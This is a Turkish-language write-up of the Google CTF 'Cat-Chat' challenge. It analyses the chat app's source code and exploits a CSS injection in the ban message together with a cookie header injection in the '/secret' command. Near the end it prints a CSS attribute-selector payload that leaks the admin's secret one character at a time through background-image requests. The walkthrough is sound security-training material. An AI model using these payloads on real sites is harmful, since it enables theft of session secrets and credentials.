# Cat-Chat  - Google CTF

```
You discover this cat enthusiast chat app, but the annoying thing about it is that you’re always banned when you start talking about dogs. Maybe if you would somehow get to know the admin’s password, you could fix that.

https://cat-chat.web.ctfcompetition.com/
```

### Ön inceleme

* **/name yeni_isim** ile isim değiştiriliyor
* **/report** dediğimiz zaman **Dog talk** konuşanları **gelip** banlıyor
* kaynak kodu verilmiş

![ilkEkran](cat-chat1.png)

Bizden istenilen ise admin parolası veya session bilgisi. Kafamızda direk XSS sorusu dedik kendi kendimize.

**/report**'u deniyelim

![ilkEkran](cat-chat2.png)

**iv3m** kullanıcısından reportlayıp **roll** kullanıcısından **dog** yazdık. Ve **admin** gelip **roll** kullanıcısını banladı.(**ban** adlı cookie'yi 1 olarak set etti)

* Admin geldiğine göre bunu bir köşeye yazalım.

### Analiz ve hata keşfi

Kaynak koduna baktığımızda(html source)

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Cat Chat</title>
  <script src="/catchat.js"></script>
  <script src="https://www.google.com/recaptcha/api.js?render=6LeB410UAAAAAGkmQanWeqOdR6TACZTVypEEXHcu"></script>
  <link rel="stylesheet" type="text/css" href="/style.css">
</head>
<body>
  <div id="panel">
    <div id="conversation">
      <p>Welcome to Cat Chat! This is your brand new room where you can discuss anything related to cats. You have been assigned a random nick name that you can change any time.</p>
      <p>Rules:</p>
      <p>- You may invite anyone to this chat room. Just share the URL.</p>
      <p>- Dog talk is strictly forbidden. If you see anyone talking about dogs, please report the incident, and the admin will take the appropriate steps. This usually means that the admin joins the room, listens to the conversation for a brief period and bans anyone who mentions dogs.</p>
      <p>Commands you can use: (just type a message starting with slash to invoke commands)</p>
      <p>- `/name YourNewName` - Change your nick name to YourNewName.</p>
      <p>- `/report` - Report dog talk to the admin.</p>
      <!--
        Admin commands:
        - `/secret asdfg` - Sets the admin password to be sent to the server with each command for authentication. It's enough to set it once a year, so no need to issue a /secret command every time you open a chat room.
        - `/ban UserName` - Bans the user with UserName from the chat (requires the correct admin password to be set).
      -->
      <p>Btw, the core of the chat engine is open source! You can download the source code <a href="/server.js">here</a>.</p>
      <p style="margin-bottom: 5em">Alright, have fun!</p>
    </div>
    <input id="messagebox" autofocus>
  </div>
</body>
</html>
```
( tüm kodu yapıştırma sebebim belki soruları geri bulamayız )

2 adet admin komutu öğrenmiş olduk

* **/secret xxx** komutu **flag** adlı cookie'yi **xxx** olarak set ediyor.
* **/ban kullanıcıAdı** admin şifresi yani flag doğru ise hedef kişiyi banlıyor.

#### Server-side kod inceleme

Back-end tarafını bizimle paylaşmıştı [server.js](https://github.com/CyberSaxosTiGER/CyberSaxosTiGER.github.io/blob/master/files/server.js)


```js
const http = require('http');
const express = require('express');
const cookieParser = require('cookie-parser')
const uuidv4 = require('uuid/v4');
const SSEClient = require('sse').Client;
const admin = require('./admin');
const pubsub = require('@google-cloud/pubsub')();
```
Temal kütüphane importları ve **admin.js**'i import ediyor. Malesef **admin.js**'e erişimimiz yok

```js
const app = express();
app.set('etag', false);
app.use(cookieParser());
```
**app.set('etag', false)** entity-tag kapatılmış. Anlayacağımız web-cache validation yok.
```js
app.use(admin.middleware);
```
**flag** cookiesi'ni kontrol edip admin mi değil mi diye kontrol ediyor

```js
app.use(function(req, res, next) {
  if (req.cookies.banned) {
    res.sendStatus(403);
    res.end();
  } else {
    next();
  }
});
```
Kullanıcı'nın banlı olup olmadığını kontrol ediyor. Eğer banlı ise **403** sayfasına yönlendiriyor.

```js
app.get('/', (req, res) => res.redirect(`/room/${uuidv4()}/`));
let roomPath = '/room/:room([0-9a-f-]{36})';
app.get(roomPath + '/', function(req, res) {
  res.sendFile(__dirname + '/static/index.html', {
    headers: {
      'Content-Security-Policy': [
        'default-src \'self\'',
        'style-src \'unsafe-inline\' \'self\'',
        'script-src \'self\' https://www.google.com/recaptcha/ https://www.gstatic.com/recaptcha/',
        'frame-src \'self\' https://www.google.com/recaptcha/',
      ].join('; ')
    },
  });
});
```
eğer **/** dizinine gidersek bize benzersiz bir id atayıp **/static/index.html**'in içeriğini göstercekmiş. Ayrıca [**CSP**](https://www.netsparker.com.tr/blog/web-guvenligi/CSP-Content-Security-Policy/) kısıtlamaları ve ayrıcalıkları verilmiş.
```js
'style-src \'unsafe-inline\' \'self\''
```
kısmını unutmamakta fayda var. Yani inline şekilde olan style ayarlarına izin var.

```js
app.all(roomPath + '/send', async function(req, res) {
  let room = req.params.room, {msg, name} = req.query, response = {}, arg;
  console.log(`${room} <-- (${name}):`, msg)
  if (!(req.headers.referer || '').replace(/^https?:\/\//, '').startsWith(req.headers.host)) {
    response = {type: "error", error: 'CSRF protection error'};
  } else if (msg[0] != '/') {
    broadcast(room, {type: 'msg', name, msg});
  } else {
    switch (msg.match(/^\/[^ ]*/)[0]) {
      case '/name':
        if (!(arg = msg.match(/\/name (.+)/))) break;
        response = {type: 'rename', name: arg[1]};
        broadcast(room, {type: 'name', name: arg[1], old: name});
      case '/ban':
        if (!(arg = msg.match(/\/ban (.+)/))) break;
        if (!req.admin) break;
        broadcast(room, {type: 'ban', name: arg[1]});
      case '/secret':
        if (!(arg = msg.match(/\/secret (.+)/))) break;
        res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
        response = {type: 'secret'};
      case '/report':
        if (!(arg = msg.match(/\/report (.+)/))) break;
        var ip = req.headers['x-forwarded-for'];
        ip = ip ? ip.split(',')[0] : req.connection.remoteAddress;
        response = await admin.report(arg[1], ip, `https://${req.headers.host}/room/${room}/`);
    }
  }
  console.log(`${room} --> (${name}):`, response)
  res.json(response);
  res.status(200);
  res.end();
});
```
Geldik mesajlar kısmına.


```js
 if (!(req.headers.referer || '').replace(/^https?:\/\//, '').startsWith(req.headers.host)) {
    response = {type: "error", error: 'CSRF protection error'};
 }
```
**Refer** based CSRF koruması varmış.

```js
else if (msg[0] != '/') {
    broadcast(room, {type: 'msg', name, msg});
}
```
Eğer mesaj **/** ile başlamıyorsa yani komut değilse mesaj olarak yolluyor.

Geldik eğer komutsa kısmına

```js
case '/name':
    if (!(arg = msg.match(/\/name (.+)/))) break;
    response = {type: 'rename', name: arg[1]};
    broadcast(room, {type: 'name', name: arg[1]old: name});
```

**/name** ise isim değiştir

```js
case '/ban':
    if (!(arg = msg.match(/\/ban (.+)/))) break;
    if (!req.admin) break;
    broadcast(room, {type: 'ban', name: arg[1]});
```
**/ban xxx** ise ve banlamak isteyen kişi **admin** ise **xx** i banla

```js
case '/secret':
    if (!(arg = msg.match(/\/secret (.+)/))) break;
    res.setHeader('Set-Cookie', 'flag=' + arg[1] + '; Path=/; Max-Age=31536000');
    response = {type: 'secret'};
```
**/secret xxx** ise **flag** cookiesini **xxx** olarak set et.

```js
case '/report':
    if (!(arg = msg.match(/\/report (.+)/))) break;
    var ip = req.headers['x-forwarded-for'];
    ip = ip ? ip.split(',')[0] : req.connection.remoteAddress;
    response = await admin.report(arg[1], ip, `https://${req.headers.host}/room/${room}/`);
```
**/report** ise **admin**'i çağır. (**x-forwarded-for** niye konulmuş bir fikrim yok ama sanırım ki içerideki reverse proxyden dolayı)


Buraya kadar öğrendiklerimiz 

* İsim değiştirebildiğimiz.
* **style-src unsafe-inline**'den dolayı inline şekilde style değişikliği yapabildiğimiz.
* flag'in /secret komutuna bağlı olduğu

#### Client-side kod inceleme

Geldik Client-side kod inceleme kısmına [cat-chat.js](https://github.com/CyberSaxosTiGER/CyberSaxosTiGER.github.io/blob/master/files/cat-chat.js)


```js
let esc = (str) => str.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;').replace(/'/g, '&apos;');
```
Escape fonksiyonuna göre **['>','<',' " ',' \' ']** karakterleri yasaklı. Bu kısımıda not edelim.

```js
function handle(data) {
  ({
    undefined(data) {},
    error(data) { display(`Something went wrong :/ Check the console for error message.`); console.error(data); },
    name(data) { display(`${esc(data.old)} is now known as ${esc(data.name)}`); },
    rename(data) { localStorage.name = data.name; },
    secret(data) { display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`); },
    msg(data) {
      let you = (data.name == localStorage.name) ? ' (you)' : '';
      if (!you && data.msg == 'Hi all') send('Hi');
      display(`<span data-name="${esc(data.name)}">${esc(data.name)}${you}</span>: <span>${esc(data.msg)}</span>`);
    },
    ban(data) {
      if (data.name == localStorage.name) {
        document.cookie = 'banned=1; Path=/';
        sse.close();
        display(`You have been banned and from now on won't be able to receive and send messages.`);
      } else {
        display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);
      }
    },
  })[data.type](data);
}
```

Bizi sadece **/name**, **/report** ve **/ban** ilgilendiriyor demiştik. 


```js
ban(data) {
  if (data.name == localStorage.name) {
document.cookie = 'banned=1; Path=/';
sse.close();
display(`You have been banned and from now on won't be able to receive and send messages.`);
  } else {
display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);
  }
}
```
**CSP**'yi hatırlayalım. **style-src**, **unsafe-inline** olarak ayarlanmış.


```js
 display(`Successfully changed secret to <span data-secret="${esc(cookie('flag'))}">*****</span>`
```
**/secret** ile **flag**'i değiştirdiğimiz zaman **flag** değeri **data-secret** attribute'una değişen hali yazılıyormuş.

![nou](cat-chat3.png)

Bunuda köşeye yazalım

```js
display(`${esc(data.name)} was banned.<style>span[data-name^=${esc(data.name)}] { color: red; }</style>`);
```
**span[data-name^=${esc(data.name)}]** temizinden bir **CSS injection**

Deneme senaryosu
* kullanıcı ismini diye değiştirsin **nendo ] {background:url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&msg=zzzzz%20you%20xxxx);}**
* diğer kullanıcı report etsin
* kullanıcı **dog** yazsın

![yrmm](cat-chat4.png)

Denememiz başarı oldu

Flag değerini **data-secret** attribute'una değişen hali yazdığını hatırlayalım.

**flag**'i değiştirmeden **data-secret** değerine yazdırmamız gerekiyor. 

**server.js**'e tekrar dönüp bakalım

```js
case '/secret':
if (!(arg = msg.match(/\/secret (.+)/))) break;
res.setHeader('Set-Cookie', 'flag=' + arg[1] '; Path=/; Max-Age=31536000');
response = {type: 'secret'};
```

**Header** set ederken girdi kontrolü yapmıyor. Başka domaine cookie'yi set edebiliriz.

```
/secret yeniSecret; Domain=x
```
Dediğimizi var sayarsak. olmayan bir domaine set edecek bundan dolayi cookie değişmeyecek.

![nou](cat-chat5.png)

Şimdi sıra **data-secret** değerini okumakta. 

bknz. [**CSS** ile veri çalmak](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense)


her karakteri backroud resmi seklinde mesaj yollamasını sağlayacağız. [**CSS Selector** ](https://www.w3schools.com/cssref/css_selectors.asp) ile durmadan ilk karakteri kontrol etmemiz gerekiyor

```css
/name 4d4] {
    background: url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&msg=/secret dummy; Domain=d2gn834g5z45m9h14fkk5rbh);
}

span[data-secret^=a] {
    background: url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&msg=a);
}
...

span[data-secret^=z] {
    background: url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&msg=z);
}

span[data-secret^=A] {
    background: url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&msg=A);
}

...

span[data-secret^=Z] {
    background: url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&msg=Z);
}

span[data-secret^=0] {
    background: url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&msg=0);
}

...

span[data-secret^=9] {
    background: url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&msg=9);
}

span[data-secret^=_] {
    background: url(/room/fa5c99a4-1bde-4998-a289-a0f424ef2e0f/send?name=admin&msg=_);
}
```

Dedik ve flag'in ilk harfini aldık

![yrmm](cat-chat6.png)

Tek tek yapmak yerine azıcık otomize etmek gerek. Yarışma esnasında yazdığımız bettiği bulamıyorum.

![yrmm](cat-chat7.png)

Ve flag **CTF{L0LC47S_43V3R**
